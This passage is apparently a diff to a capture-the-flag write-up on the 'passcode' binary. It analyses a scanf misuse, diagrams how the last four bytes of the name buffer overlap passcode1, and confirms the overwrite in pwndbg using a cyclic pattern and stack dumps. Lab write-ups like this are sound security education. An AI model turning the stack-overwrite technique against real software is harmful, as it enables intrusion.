@@ -161,3 +161,103 @@ End of assembler dump
 In `login()`, which has the incorrect usage of `scanf()`, the first argument is the value at address `ebp-0x10` for `passcode1` and the value address `ebp-0xc` for `passcode2` respectively, instead of their adresses.
 
 This results in `scanf()` treating those integer values as pointers and trying to write user input to those potentially invalid addresses, which can cause a segmentation fault or undefined behavior.
+
+There is also something else we can observe in the disassembled code.
+
+The `name` buffer which is 100 bytes long, is initialized at address `ebp-0x70`, while `passcode1` is stored at `ebp-0x10`.
+This means that the program is reusing th stack and that the last 4 bytes of `name` overlap with `passcode`.
+
+```
+<==: Value is stored at the address
+<--: Points to the address
+
+                       +---------------+
+                  *==> |  61 61 61 61  |
+                 /     |  62 61 61 61  | 
+                /      |  63 61 61 61  |
+               |       |  64 61 61 61  |
+               |       |  65 61 61 61  |
+               |       |  66 61 61 61  |
+               |       |  67 61 61 61  |
+               |       |  68 61 61 61  |
+               |       |  69 61 61 61  |
+               |       |  6A 61 61 61  |
+               |       |  6B 61 61 61  |
+               |       |  6C 61 61 61  | 
+        name ==|       |  6D 61 61 61  |
+               |       |  6E 61 61 61  |
+               |       |  6F 61 61 61  |
+               |       |  70 61 61 61  |
+               |       |  71 61 61 61  |
+               |       |  72 61 61 61  |
+               |       |  73 61 61 61  |
+               |       |  74 61 61 61  |
+               |       |  75 61 61 61  |
+               |       |  76 61 61 61  |
+                \      |  77 61 61 61  |
+                 \     |  78 61 61 61  |
+                  *==> |  79 61 61 61  | <== passcode1
+                       |  00 00 00 00  |
+                       |  00 00 00 00  |
+                       |  00 00 00 00  |
+                       +---------------+
+               ebp --> |  6C 61 61 61  | 
+                       +---------------+
+    
+
+```
+
+Let's verify.
+
+```
+pwndbg> break login
+Breakpoint 1 at 0x80491fb
+```
+
+Let's create a cyclic pattern of length 100 bytes.
+
+```
+pwndbg> cyclic
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+```
+
+We can now run the challenge within GDB and pass the cyclic pattern as input.
+
+```
+pwndbg> run
+Starting program: /home/passcode/passcode
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Toddler's Secure Login System 1.1 beta.
+enter you name : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+Welcome aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!
+
+Breakpoint 1, 0x080491fb in login ()
+
+# --- snip ---
+```
+
+Once our breakpoint within `login()` is hit, we can display the stack.
+
+```
+pwndbg> x/25wx $ebp-0x70
+0xffd33f08:	0x61616161	0x61616162	0x61616163	0x61616164
+0xffd33f18:	0x61616165	0x61616166	0x61616167	0x61616168
+0xffd33f28:	0x61616169	0x6161616a	0x6161616b	0x6161616c
+0xffd33f38:	0x6161616d	0x6161616e	0x6161616f	0x61616170
+0xffd33f48:	0x61616171	0x61616172	0x61616173	0x61616174
+0xffd33f58:	0x61616175	0x61616176	0x61616177	0x61616178
+0xffd33f68:	0x61616179
+```
+
+The 25th word is `0x61616179` i.e. `yaaa` in ASCII.
+
+Now, let's display the address of `passcode1` which is at `ebp-0x10`.
+
+```
+pwndbg> x/wx $ebp-0x10
+0xffd33f68:	0x61616179
+```
+
+We can see that is the same word `yaaa`. This proves that we can overwrite the value of `passcode1`.
+
